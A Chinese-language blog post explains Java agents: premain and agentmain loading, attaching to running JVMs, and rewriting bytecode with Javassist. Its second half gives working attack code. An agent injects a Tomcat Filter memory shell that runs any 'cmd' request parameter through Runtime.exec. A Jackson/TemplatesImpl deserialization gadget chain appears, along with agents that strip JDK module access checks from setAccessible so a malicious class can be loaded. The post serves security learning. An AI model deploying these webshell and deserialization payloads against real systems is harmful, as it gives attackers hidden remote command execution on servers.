
---
date: 2024-09-29
title: java agent的基础讲解和一些利用
tags:
  - java安全
  - myblog
---

# Agent基本认识

Agent（代理）来讲，其大致可以分为两种，一种是在 JVM 启动前加载的`premain-Agent`，另一种是 JVM 启动之后加载的 `agentmain-Agent`。这里我们可以将其理解成一种特殊的 Interceptor（拦截器）

## premain-Agent

首先我们先定义这样一个 agent.jar

```java
public class Java_Agent_premain {
    public static void premain(String args, Instrumentation inst) {
        for (int i=0 ; i<10 ; i++){
            System.out.println("调用了premain-Agent！");
        }
    }
}
```

Agent.mf 

```
Manifest-Version: 1.0
Premain-Class: Java_Agent_premain
```

然后 生成我们的 premain agent

`jar cvfm agent.jar META-INF/maven/agent.MF Java_Agent_premain.class`



相应的我们准备一个 hello.jar

```java
public class Hello {
    public static void main(String[] args) {
        System.out.println("hello");
    }
}
```

hello.mf

```
Manifest-Version: 1.0
Main-Class: Hello
```

jar cvfm hello.jar META-INF/maven/hello.mf Hello.class



然后其实可以发现我们的Java_Agent_premain 是运行Hello之前的。

这个premain-Agent是在jvm启动前加载的。

```
java -javaagent:agent.jar -jar hello.jar
调用了premain-Agent！
调用了premain-Agent！
调用了premain-Agent！
调用了premain-Agent！
调用了premain-Agent！
调用了premain-Agent！
调用了premain-Agent！
调用了premain-Agent！
调用了premain-Agent！
调用了premain-Agent！
Hello World!
```

## VirtualMachine

先说一下环境，引入 tool.jar

```xml
<dependency>
  <groupId>com.sun</groupId>
  <artifactId>tools</artifactId>
  <version>1.8.0</version>
  <scope>system</scope>
  <systemPath>/Library/Java/JavaVirtualMachines/jdk8u275/lib/tools.jar</systemPath>
</dependency>
```



`com.sun.tools.attach.VirtualMachine`类可以实现获取JVM信息，内存dump、现成dump、类信息统计（例如JVM加载的类）等功能。

比如这个 获取特定虚拟机PID

```java
public class get_PID {
    public static void main(String[] args) {
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for(VirtualMachineDescriptor vmd : list){
            //遍历每一个正在运行的JVM，如果JVM名称为get_PID则返回其PID
            if(vmd.displayName().equals("com.drunkbaby.get_PID"))
                System.out.println(vmd.id()); 
        }
    }
}
```



## agentmain-Agent

premain-Agent是在 JVM 启动前加载的,这个agentmain是 JVM 启动之后加载的。

先编写一个 `Sleep_Hello` 类，模拟正在运行的 JVM

```java
package com.drunkbaby;  
  
import static java.lang.Thread.sleep;  
  
public class Sleep_Hello {  
    public static void main(String[] args) throws InterruptedException {  
        while (true){  
            System.out.println("Hello World!");  
            sleep(5000);  
        }  
    }  
}
```

编写我们的 agentmain

```java
public class Java_Agent_agentmain {
    public static void agentmain(String args, Instrumentation inst) throws InterruptedException {
        while (true){
            System.out.println("调用了agentmain-Agent!");
            sleep(3000);
        }
    }
}
```

mf文件

```
Manifest-Version: 1.0
Agent-Class: com.drunkbaby.Java_Agent_agentmain
```

jar cvfm hello.jar META-INF/MAINFEST.MF Java_Agent_agentmain.class



然后开始注入

```java
public class Inject_Agent {
    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {
        //调用VirtualMachine.list()获取正在运行的JVM列表
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for(VirtualMachineDescriptor vmd : list){
            //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent
            if(vmd.displayName().equals("com.drunkbaby.Sleep_Hello")){

                //连接指定JVM
                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());
                //加载Agent
                virtualMachine.loadAgent("/Users/taoyu/Music/code/java_code/Java-Agent-Memshell/Agentmain/src/main/resources/hello.jar");
                //断开JVM连接
                virtualMachine.detach();
            }
        }
    }
}
```

先运行Sleep_Hello再运行Inject_Agent。输出如下。

```
Hello World!
调用了agentmain-Agent!
Hello World!
调用了agentmain-Agent!
调用了agentmain-Agent!
```

 

> 但是这里我们这里只是插入，而不是改变。

## 动态修改字节码 

Instrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent 通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。

ClassFileTransformer接口下面有一个addTransformer方法。重写该方法即可转换任意类文件，并返回新的被取代的类文件，



下面我们来修改这个正在运行的hello

```java
public class Sleep_Hello {
    public static void main(String[] args) throws InterruptedException {
        while(true) {
            hello();
            sleep(3000);
        }
    }
    public static void hello(){
        System.out.println("Hello World!");
    }
}
```



一个实现了ClassFileTransformer接口的类。

```java
public class Hello_Transform implements ClassFileTransformer {

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        try {
            //获取CtClass 对象的容器 ClassPool
            ClassPool classPool = ClassPool.getDefault();
            //添加额外的类搜索路径
            if (classBeingRedefined != null) {
                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
                classPool.insertClassPath(ccp);
            }
            //获取目标类
            CtClass ctClass = classPool.get("AgentShell.Sleep_Hello");
            System.out.println(ctClass);
            //获取目标方法
            CtMethod ctMethod = ctClass.getDeclaredMethod("hello");
            //设置方法体
            String body = "{System.out.println(\"Hacker!\");}";
            ctMethod.setBody(body);
            //返回目标类字节码
            byte[] bytes = ctClass.toBytecode();
            return bytes;
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
```

agent 

```java
public class agentmain_transform {
    public static void agentmain(String args, Instrumentation inst) throws InterruptedException, UnmodifiableClassException {
        Class [] classes = inst.getAllLoadedClasses();

        //获取目标JVM加载的全部类
        for(Class cls : classes){
            if (cls.getName().equals("AgentShell.Sleep_Hello")){

                //添加一个transformer到Instrumentation，并重新触发目标类加载
                inst.addTransformer(new Hello_Transform(),true);
                inst.retransformClasses(cls);
            }
        }
    }
}
```

修改一下mf文件

```
Manifest-Version: 1.0
Agent-Class: AgentShell.agentmain_transform
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```

pom.xml  这里使用assembly生成说需要的jar包

```xml
<build>
  <plugins>
    <plugin>
      <groupId>org.apache.maven.plugins</groupId>
      <artifactId>maven-assembly-plugin</artifactId>
      <version>2.6</version>
      <configuration>
        <descriptorRefs>
          <descriptorRef>jar-with-dependencies</descriptorRef>
        </descriptorRefs>
        <archive>
          <manifestFile>
            src/main/resources/META-INF/maven/MAINFEST.MF
          </manifestFile>
        </archive>
      </configuration>
    </plugin>
    <plugin>
      <groupId>org.apache.maven.plugins</groupId>
      <artifactId>maven-compiler-plugin</artifactId>
      <configuration>
        <source>6</source>
        <target>6</target>
      </configuration>
    </plugin>
  </plugins>
</build>
```



先运行Sleep_Hello 再运行这个

```java
public class Inject_Agent {
    public static void main(String[] args) throws Exception {
        //调用VirtualMachine.list()获取正在运行的JVM列表
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for(VirtualMachineDescriptor vmd : list){
            System.out.println(vmd.displayName());
            //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent
            if(vmd.displayName().equals("AgentShell.Sleep_Hello")){
                //连接指定JVM
                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());
                //加载Agent
                virtualMachine.loadAgent("/Users/taoyu/Music/code/java_code/Java-Agent-Memshell/Instrumentation/target/Instrumentation-1.0-SNAPSHOT-jar-with-dependencies.jar");
                //断开JVM连接
                virtualMachine.detach();
            }
        }
    }
}
```



```
Hello World!
Hello World!
Hello World!
Hello World!
Hello World!
Hello World!
javassist.CtClassType@6ae33825[public class AgentShell.Sleep_Hello fields= constructors=javassist.CtConstructor@58966603[public Sleep_Hello ()V],  methods=javassist.CtMethod@44a4fe33[public static main ([Ljava/lang/String;)V], javassist.CtMethod@30063153[public static hello ()V], ]
Hacker!
Hacker!
```



# 一些利用

## 利用agentmain注入Filter内存马

准备好实现了ClassFileTransformer接口的Filter_Transform

```java
public class Filter_Transform implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        try {

            //获取CtClass 对象的容器 ClassPool
            ClassPool classPool = ClassPool.getDefault();

            //添加额外的类搜索路径
            if (classBeingRedefined != null) {
                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
                classPool.insertClassPath(ccp);
            }

            //获取目标类
            CtClass ctClass = classPool.get("org.apache.catalina.core.ApplicationFilterChain");

            //获取目标方法
            CtMethod ctMethod = ctClass.getDeclaredMethod("doFilter");

            //设置方法体
            String body = "{" +
                    "javax.servlet.http.HttpServletRequest request = $1\n;" +
                    "String cmd=request.getParameter(\"cmd\");\n" +
                    "if (cmd !=null){\n" +
                    "  Runtime.getRuntime().exec(cmd);\n" +
                    "  }"+
                    "}";
            ctMethod.setBody(body);

            //返回目标类字节码
            byte[] bytes = ctClass.toBytecode();
            return bytes;

        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
```

准备agent

```java
public class agentmain_transform {
    public static void agentmain(String args, Instrumentation inst) throws InterruptedException, UnmodifiableClassException {
        Class [] classes = inst.getAllLoadedClasses();

        //获取目标JVM加载的全部类
        for(Class cls : classes){
            if (cls.getName().equals("org.apache.catalina.core.ApplicationFilterChain")){

                //添加一个transformer到Instrumentation，并重新触发目标类加载
                inst.addTransformer(new Filter_Transform(),true);
                inst.retransformClasses(cls);
            }
        }
    }
}
```

mf文件

```
Manifest-Version: 1.0
Agent-Class: com.drunkbaby.agentmain_transform
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```

生成对应jar包,然后开始注入

```java
public class Inject_Agent {
    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException {
        //调用VirtualMachine.list()获取正在运行的JVM列表
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for(VirtualMachineDescriptor vmd : list){
            System.out.println(vmd.displayName());
            //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent
            if(vmd.displayName().contains("JavaAgentSpringBootApplication")){

                //连接指定JVM
                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());
                //加载Agent
                virtualMachine.loadAgent("/Users/taoyu/Music/code/java_code/Java-Agent-Memshell/AgentInjectionExample/target/AgentInjectionExample-1.0-SNAPSHOT-jar-with-dependencies.jar");
                //断开JVM连接
                virtualMachine.detach();
            }

        }
    }
}
```

注入成功。

![image-20241120183255665](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241120183255665.png)

## Jackson删除writeReplace方法

说到这个链子，我们都知道需要删除BaseJsonNode的writeReplace方法。但是我们其实可以在premain的时候就把这件事情给做了。

```java
Object template = Gadgets.createTemplatesImpl("open -a Calculator");

CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
ctClass.removeMethod(writeReplace);
ctClass.toClass();

POJONode jsonNodes = new POJONode(template);
BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
Reflections.setFieldValue(badAttributeValueExpException, "val", jsonNodes);

System.out.println(Tool.base64Encode(Tool.serialize(badAttributeValueExpException)));
```

transform

```java
public class JacksonClassFileTransformer implements ClassFileTransformer {

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer){
        String target1 = "com.fasterxml.jackson.databind.node.BaseJsonNode";
        String className2 = className.replace("/", ".");
        if (className2.equals(target1)) {
            System.out.println("Find the Inject Class: "+target1);
            ClassPool pool = ClassPool.getDefault();
            try {
                CtClass c = pool.getCtClass(className2);
                CtMethod ctMethod = c.getDeclaredMethod("writeReplace");
                c.removeMethod(ctMethod);
                byte[] bytes = c.toBytecode();
                c.detach();
                return bytes;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return new byte[0];
    }

}
```

agent

```java
public class JacksonAgent {
    public static void premain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException {

        inst.addTransformer(new JacksonClassFileTransformer(),true);
        Class[] allLoadedClasses = inst.getAllLoadedClasses();

        for (Class loadedClass : allLoadedClasses) {
            if("com.fasterxml.jackson.databind.node.BaseJsonNode".equals(loadedClass.getName())){
                //重新transform
                inst.retransformClasses(loadedClass);
            }
        }
    }
}
```

.mf

```
Manifest-Version: 1.0
Can-Redefine-Classes: true
Can-Retransform-Classes: true
Premain-Class: cn.org.unk.JacksonAgent
```

然后我们生成对应的jar包。

然后我们需要让项目运行的时候加上这样一个参数.带上我们的premain agent。

`-javaagent:/Users/taoyu/Music/code/java_code/Java-useful-agent/Java17/target/Java17-premain.jar`

Run->edit configurations

![image-20241120183210072](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241120183210072.png)

然后我们构造链子的好时候就可以将以下代码删除依旧不影响我们poc的构造

```
CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
ctClass.removeMethod(writeReplace);
ctClass.toClass();
```



## 高版本jdk反射修改私有属性

dk9出现了module机制：https://zhuanlan.zhihu.com/p/640217638



java.xml是module的名字，不一定要和包名一样。

exports表示外部可以访问当前module的哪些package。

exports…to 表示指定该package只能被哪些package访问。

同一个module下的类可以互相访问。



我们以这个链子为例。

EventListenerList ReadObject -> ToString

```java
Person p = new Person("aaa");
EventListenerList list = new EventListenerList();

UndoManager manager = new UndoManager();
Vector vector = (Vector) getFieldValue(manager, "edits");
vector.add(p);
setFieldValue(list, "listenerList", new Object[]{InternalError.class, manager});

byte[] code = serialize(list);
unserialize(code);
```

Person

```java
public String toString() {
    System.out.println("this is tostring");
}
```

我们正常情况下调用私有属性的时候。下面这个 flag值为true。

```java
public void setAccessible(boolean flag) {
    AccessibleObject.checkPermission();
    if (flag) checkCanSetAccessible(Reflection.getCallerClass());
    setAccessible0(flag);
}
```

会爆以下错误。但是我们如果设置一个premain，就可以修改这段代码。让flag恒为flase。这样我们就可以setAccessible来进行各种操作了。

```
Exception in thread "main" java.lang.reflect.InaccessibleObjectException: Unable to make field protected java.util.Vector javax.swing.undo.CompoundEdit.edits accessible: module java.desktop does not "opens javax.swing.undo" to unnamed module @60d14f0f
	at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:354)
	at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:297)
	at java.base/java.lang.reflect.Field.checkCanSetAccessible(Field.java:178)
```



```java
public class MyClassFileTransformer implements ClassFileTransformer {

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer){

        String target4 = "java.lang.reflect.Field";
        String className2 = className.replace("/", ".");

        if (className2.equals(target4)) {
            System.out.println("Find the Inject Class: "+target4);
            ClassPool pool = ClassPool.getDefault();
            try {

                CtClass c = pool.getCtClass(className2);
                System.out.println("hhhh");
                CtMethod ctMethod = c.getDeclaredMethod("setAccessible");

                ctMethod.setBody("{        java.lang.reflect.AccessibleObject.checkPermission();\n" +
                        "        if (false) checkCanSetAccessible(Reflection.getCallerClass());\n" +
                        "        setAccessible0($1);}");
                byte[] bytes = c.toBytecode();
                c.detach();
                return bytes;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return new byte[0];
    }

}
```



```java
public class MyAgent {

    public static void premain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException {

        inst.addTransformer(new MyClassFileTransformer(),true);
        Class[] allLoadedClasses = inst.getAllLoadedClasses();

        for (Class loadedClass : allLoadedClasses) {
            if("java.lang.reflect.Field".equals(loadedClass.getName())){
                //重新transform
                inst.retransformClasses(loadedClass);
            }
        }
    }
}
```



## 高版本JDK反射类加载

由于高版本的module机制，

无法反射调用 TemplatesImpl 的get方法，POJONode的toString -> 到任意get 的这种方法也没有办法用。

但是我们可以修改Method 的 setAccessible也修改一下我们就可以了。但是需要让服务端加载这个permain时不太现实的。

但是我们可以通过agentmain进行修改，但是有那种功夫，我们还不如注入内存马。直接拿shell。



把上面的那个agent 的 Filed改成Method就可以了。
这样的这个恶意类在jdk17的环境下依旧是可以被加载的。

```java
byte[] bytes = Files.readAllBytes(Paths.get("target/classes/Evil.class"));

Method method = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
method.setAccessible(true);
((Class)method.invoke(ClassLoader.getSystemClassLoader(), "Evil", bytes, 0, bytes.length)).newInstance();

```








